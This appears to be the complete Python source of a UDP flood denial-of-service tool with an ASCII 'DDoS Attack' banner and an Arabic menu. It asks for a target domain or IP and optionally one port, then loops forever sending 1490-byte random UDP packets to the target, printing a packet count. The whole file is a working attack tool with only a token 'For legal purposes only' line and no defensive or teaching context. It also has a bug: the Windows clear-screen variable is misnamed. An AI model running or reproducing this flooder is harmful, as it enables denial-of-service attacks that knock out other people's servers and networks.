"""
Copyright (c) 2023-2024 Vladimir Rogozin (https://github.com/Cyber-218)

Distributed under the MIT License (MIT) (See accompanying file LICENSE.txt
or copy at http://opensource.org/licenses/MIT)
"""

# Import.
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet


# Version.
version = "1.00"


# Platform info
uname=system()

if uname == "Windows":
    cmd_clear_clear = 'cls'
else:
    cmd_clear = 'clear'

os.system(cmd_clear)


# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)


# RDDoS_Tool
while True:
    # UI.
    print(""" \033[1;34m
                                                                           
#####  #####   ####   ####       ##   ##### #####   ##    ####  #    # 
#    # #    # #    # #          #  #    #     #    #  #  #    # #   #  
#    # #    # #    #  ####     #    #   #     #   #    # #      ####   
#    # #    # #    #      #    ######   #     #   ###### #      #  #   
#    # #    # #    # #    #    #    #   #     #   #    # #    # #   #  
#####  #####   ####   ####     #    #   #     #   #    #  ####  #    # 
                                                                       
 \033[0m   """)
    print(" \033[1;30m Version: " + version)       
    print("Github: https://github.com/Cyber-218")
    print(' For legal purposes only')
    print("\033[0;32m")
    print("1. نطاق موقع الويب \n2. عنوان IP \n3. عن \n4. مخرج ")
    print('\033[0m')

    # Input.
    opt = str(input("\n> "))

    # Selection.
    if opt == '1':
        domain = str(input("الدومين:"))
        ip = socket.gethostbyname(domain)
        break

    elif opt == '2':
        ip = str(input("عنوان IP: "))
        break

    elif opt == '3':
        print("\033[0;32m")
        print("اداة Dos Attack من تطوير Cyber218") 
        print('\033[0m')
        goon = input("\n\n\n\n\n\n\nPress Enter to continue.")
        os.system(cmd_clear)

    elif opt == '4':
        exit()

    else:
        print('\033[91mاختيار غير صالح! !\033[0m')
        time.sleep(2)
        os.system(cmd_clear)

# Port selection.
port_mode = False # If 'False' all ports will be use, if 'True' - certain.
port = 2

while 1:
    print("\033[91m")
    port_bool = str(input("تأكيد البورت? [y/n]: "))
    print('\033[0m')
    if (port_bool == "y") or (port_bool == "Y"):
        port_mode = True
        port = int(input("بورت: "))
        break

    elif (port_bool == "n") or (port_bool == "N"):
        break

    else:
        print('\033[91mاختيار غير صالح! \033[0m')
        time.sleep(2)

# Starting working.
os.system(cmd_clear)
print('\033[36;2mجار تهيئة.... ')
time.sleep(1)
print('ابتداء... ')
time.sleep(4)

sent = 0

if port_mode == False:  # All ports.
    try:
        while True:
            if port == 65534:
                port = 1

            elif port == 1900:
                port = 1901

            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print("\033[32;1m مرسل  %s الحزم ل  %s من خلال المنفذ :%s"%(sent, ip, port))
    except:
        print('\n\033[31;1mExited\033[0m')

elif port_mode == True: # Certain port.
    if port < 2:
        port = 2
        
    elif port == 65534:
        port = 2

    elif port == 1900:
        port = 1901

    try:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("\033[32;1mمرسل %s حزمه ل %s من خلال منفذ:%s"%(sent, ip, port))      
    except:
        print('\n\033[31;1mExited\033[0m')
